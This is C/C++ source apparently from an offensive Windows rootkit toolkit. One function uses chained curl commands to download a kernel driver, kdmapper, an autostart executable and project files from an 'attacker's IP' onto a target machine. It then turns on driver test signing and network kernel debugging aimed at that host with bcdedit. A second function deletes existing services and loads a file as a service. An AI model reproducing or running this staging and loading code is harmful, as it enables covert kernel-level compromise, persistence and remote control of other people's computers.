#include "configurations.h"


BOOL FilesAndDebugging(const char* AttackerIp, const char* DebugPort, const char* DebugKey) {
	if (AttackerIp == NULL) {
		printf("[-] Cannot get needed files on target machine - attacker's IP address is not specified!\n");
		return FALSE;
	}
	if (system("taskkill /F /IM MainMedium.exe > nul") == -1) {
		printf("[-] Failed execution of initial termination command of MainMedium.exe - %d\n", GetLastError());
		return FALSE;
	}
	if (system("if exist C:\\nosusfolder rmdir /s /q C:\\nosusfolder > nul") == -1) {
		printf("[-] Failed execution of initial deleting command of nosusfolder - %d\n", GetLastError());
		return FALSE;
	}

	const char* ReplaceArr[3] = { AttackerIp, DebugPort, DebugKey };
	const char* SymbolsArr = "~`\'";
	const int TotalCommands = 23;
	const char* FileCommands[TotalCommands] = {
		"cd C:\\ > nul && ",
		"mkdir nosusfolder\\verysus\\MainMedium\\x64\\Release > nul && ",
		"curl http://~:8080/MainMedium/MainMedium.sln --output nosusfolder\\verysus\\MainMedium\\MainMedium.sln > nul && ",
		"curl http://~:8080/MainMedium/medium.cpp --output nosusfolder\\verysus\\MainMedium\\medium.cpp > nul && ",
		"curl http://~:8080/MainMedium/medium.h --output nosusfolder\\verysus\\MainMedium\\medium.h > nul && ",
		"curl http://~:8080/MainMedium/rootreqs.cpp --output nosusfolder\\verysus\\MainMedium\\rootreqs.cpp > nul && ",
		"curl http://~:8080/MainMedium/rootreqs.h --output nosusfolder\\verysus\\MainMedium\\rootreqs.h > nul && ",
		"curl http://~:8080/MainMedium/internet.cpp --output nosusfolder\\verysus\\MainMedium\\internet.cpp > nul && ",
		"curl http://~:8080/MainMedium/internet.h --output nosusfolder\\verysus\\MainMedium\\internet.h > nul && ",
		"curl http://~:8080/MainMedium/helpers.cpp --output nosusfolder\\verysus\\MainMedium\\helpers.cpp > nul && ",
		"curl http://~:8080/MainMedium/helpers.h --output nosusfolder\\verysus\\MainMedium\\helpers.h > nul && "
		"curl http://~:8080/MainMedium/MainMedium.vcxproj --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj > nul && ",
		"curl http://~:8080/MainMedium/MainMedium.vcxproj.filters --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.filters > nul && ",
		"curl http://~:8080/MainMedium/MainMedium.vcxproj.user --output nosusfolder\\verysus\\MainMedium\\MainMedium.vcxproj.user > nul && ",
		"curl http://~:8080/MainMedium/x64/Release/MainMedium.exe --output nosusfolder\\verysus\\MainMedium\\x64\\Release\\MainMedium.exe > nul && ",
	    "mkdir nosusfolder\\verysus\\KMDFdriver\\Release > nul && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.sys --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.sys > nul && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver/KMDFdriver.inf --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.inf > nul && ",
		"curl http://~:8080/KMDFdriver/x64/Release/KMDFdriver.pdb --output nosusfolder\\verysus\\KMDFdriver\\Release\\KMDFdriver.pdb > nul && ",
		"curl http://~:8080/kdmapper/x64/Release/kdmapper.exe --output nosusfolder\\verysus\\kdmapper.exe > nul && ",	
		"curl http://~:8080/trypack/AutoStart/x64/Release/AutoStart.exe --output nosusfolder\\verysus\\AutoStart.exe > nul && ",
		"bcdedit /set TESTSIGNING ON > nul && ",
		"bcdedit /set DEBUG ON > nul && ",
		"bcdedit /dbgsettings NET HOSTIP:~ PORT:` KEY:\' > nul" };

	return PerformCommand(FileCommands, ReplaceArr, SymbolsArr, TotalCommands, 3);
}


BOOL SignAsService(char* ServicePath, RootService* ServiceObject, const char* ServiceName, DWORD ServiceType, DWORD ServiceStart, DWORD ErrorControl, const char* ServiceExt) {
	HANDLE ServiceHandle = INVALID_HANDLE_VALUE;
	DWORD ServiceSize = 0;
	PVOID ServiceBuffer = NULL;
	DWORD ServiceRead = 0;
	const char* RemoveExBase = "sc stop ~ > nul && sc delete ~ > nul ";
	char RemoveExisting[MAX_PATH] = { 0 };
	int ri = 0;


	// Delete existing service (if exists) -
	for (int i = 0; i <= strlen(RemoveExBase); i++) {
		if (RemoveExBase[i] == '~') {
			for (int ii = 0; ii < strlen(ServiceName); ii++) {
				RemoveExisting[ri] = ServiceName[ii];
				ri++;
			}
		}
		else {
			RemoveExisting[ri] = RemoveExBase[i];
			ri++;
		}
	}

	if (system(RemoveExisting) == -1) {
		return FALSE;
	}


	// Open handle and get size -
	ServiceHandle = CreateFileA(ServicePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (ServiceHandle == INVALID_HANDLE_VALUE) {
		printf("Create reading file to create service (path = %s) - %d\n", ServicePath, GetLastError());
		return FALSE;
	}
	printf("LOG Created reading file to create service\n");

	ServiceSize = GetFileSize(ServiceHandle, NULL);
	if (ServiceSize == 0) {
		CloseHandle(ServiceHandle);
		printf("ServiceSize = 0\n");
		return FALSE;
	}
	printf("LOG Got file size of reading file to create service\n");


	// Initiate service -
	if (!ServiceObject->InitiateService(ServicePath, ServiceType, ErrorControl, ServiceStart, ServiceName, ServiceSize, ServiceExt)) {
		ServiceObject->FreeServiceBuffer();
		CloseHandle(ServiceHandle);
		printf("Initiating service object\n");
		return FALSE;
	}
	printf("LOG Initiated service object\n");


	// Read file content into buffer -
	ServiceBuffer = malloc(ServiceSize);
	if (ServiceBuffer == NULL) {
		ServiceObject->FreeServiceBuffer();
		CloseHandle(ServiceHandle);
		printf("Allocating service buffer\n");
		return FALSE;
	}
	printf("LOG Allocated service buffer\n");

	if (!ReadFile(ServiceHandle, ServiceBuffer, ServiceSize, &ServiceRead, NULL) || ServiceRead != ServiceSize) {
		ServiceObject->FreeServiceBuffer();
		free(ServiceBuffer);
		CloseHandle(ServiceHandle);
		printf("Reading service data - %d\n", GetLastError());
		return FALSE;
	}
	printf("LOG Read service data\n");
	CloseHandle(ServiceHandle);


	// Copy buffer in the service file buffer -
	ServiceObject->BufferOperation(ServiceBuffer, ServiceSize, FALSE);
	free(ServiceBuffer);


	// Load (create service entry on temp file copy and start service ONLY if demand_start is on) service -
	if (!ServiceObject->LoadService()) {
		ServiceObject->FreeServiceBuffer();
		printf("Loading service\n");
		return FALSE;
	}
	printf("LOG Loaded service\n");
	return TRUE;
}